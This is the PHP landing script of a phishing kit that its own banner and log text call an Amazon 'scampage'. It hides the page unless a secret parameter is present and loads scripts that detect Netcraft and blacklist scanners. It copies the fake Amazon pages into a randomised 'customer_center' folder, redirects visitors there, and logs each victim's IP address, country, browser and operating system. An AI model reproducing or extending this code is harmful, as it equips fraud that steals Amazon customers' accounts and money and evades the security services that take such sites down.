<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
session_start();
error_reporting(0);
require "config.php";
if(!isset($_GET["$param"]))
{
    @require_once "._ops.php";
}
else
{
require "blocker.php";
require "kill-bot/netcraft_check.php";
require "kill-bot/blacklist_lookup.php";
require "ap/functions/Mfunctions.php";
require "ap/functions/get_lang.php";
require "ap/functions/get_browser.php";
if (strlen(SERVER_GATEWAY()) !== 30) { @SgenRan(dirname(__DIR__));}
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./customer_center/openid.assoc_handle=".$DIR;
$SOMETHING="ap";
function recurse_copy($SOMETHING,$DIR) {
$dir = opendir($SOMETHING);
@mkdir($DIR);
while(false !== ( $somefile = readdir($dir)) ) {
if (( $somefile != '.' ) && ( $somefile != '..' )) {
if ( is_dir($SOMETHING . '/' . $somefile) ) {
recurse_copy($SOMETHING . '/' . $somefile,$DIR . '/' . $somefile);
}
else { 
copy($SOMETHING . '/' . $somefile,$DIR . '/' . $somefile);
}
}
}
closedir($dir);
}
recurse_copy( $SOMETHING, $DIR );
header("LOCATION: ".$DIR."");

$file = "logs/some-click.txt";
$isi  = @file_get_contents($file);
$buka = fopen($file,"w"); 
fwrite($buka, $isi+1);
fclose($buka);

    $see = fopen("logs/some-log.txt","a");
    $jam = date("h:i:sa");
    fwrite($see,"[ $jam - ".$_SESSION['_ip_']." - ".$_SESSION['_LOOKUP_COUNTRY_']." - ".SOME_Browser($_SERVER['HTTP_USER_AGENT'])." - ".SOME_OS($_SERVER['HTTP_USER_AGENT'])." ] Mengunjungi Scampage Amazon"."\n");
    fclose($see);
}
?>
